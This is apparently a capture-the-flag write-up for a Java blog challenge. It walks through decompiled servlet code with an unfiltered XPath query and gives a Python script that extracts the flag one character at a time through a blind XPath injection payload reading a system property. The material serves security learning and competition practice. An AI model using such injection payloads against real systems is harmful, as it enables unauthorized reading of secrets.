# Myblog

**Author**: jkr

**Tags:** web

**Points:** 884 (19 solves)

**Description:** 

> I made a blog. Please check the security.

myblog is a simple blog that allows registering a user as well as reading and writing blog posts that have a title and content. The complete application logic is in `blogServlet.class`. After decompilation we see the request routing and user/session handling. The only function that is standing out to be exploitable is `doReadArticle()` that gets called when viewing a blog post.

```java=
  private String[] doReadArticle(HttpServletRequest req) {
    String id = (String)req.getSession().getAttribute("id");
    String idx = req.getParameter("idx");
    if ("null".equals(id) || idx == null)
      return null; 
    File userArticle = new File(this.tmpDir + "/article/", id + ".xml");
    try {
      InputSource is = new InputSource(new FileInputStream(userArticle));
      Document document = DocumentBuilderFactory.newInstance().newDocumentBuilder().parse(is);
      XPath xpath = XPathFactory.newInstance().newXPath();
      String title = (String)xpath.evaluate("//article[@idx='" + idx + "']/title/text()", document, XPathConstants.STRING);
      String content = (String)xpath.evaluate("//article[@idx='" + idx + "']/content/text()", document, XPathConstants.STRING);
      title = decBase64(title.trim());
      content = decBase64(content.trim());
      return new String[] { title, content };
    } catch (Exception e) {
      System.out.println(e.getMessage());
      return null;
    } 
  }
```

As `idx` parameter is unfiltered and this parameter goes straight into an XPath evaluation we can inject into XPath. Given the flag being placed in `catalina.properties` of tomcat means that the flag will be available as a system property called `flag`. Lucky enough XPath allows to access a system property using `fn:system-property()` as documented in the [XSL function spec](https://www.w3schools.com/xml/func_systemproperty.asp).

We can use the XPath injection to have an oracle (true/false) using an injected XPath. After creating a blog post containing the word `MARKER` in title and content we use following script to brute the flag content using the true/false oracle of the injection `1' and starts-with(system-property('flag'),'FLAGHERE') or '`:

```python=
#!/usr/bin/python
import requests, string
headers = {"Cookie":"JSESSIONID=42442D352EBC41CE4FE07B8C0B72820C"}
chars = "abcdef0123456789}{"

url = 'http://3.39.79.180/blog/read?idx=1%27%20and%20starts-with(system-property(%27flag%27),%27{0}%27)%20or%20%27'
p = 'codegate2022{'
while True:
    print p
    for x in chars:
        r = requests.get(url.format(p+x), headers=headers, allow_redirects=False)
        if "MARKER" in r.text:
            p += x
            break
```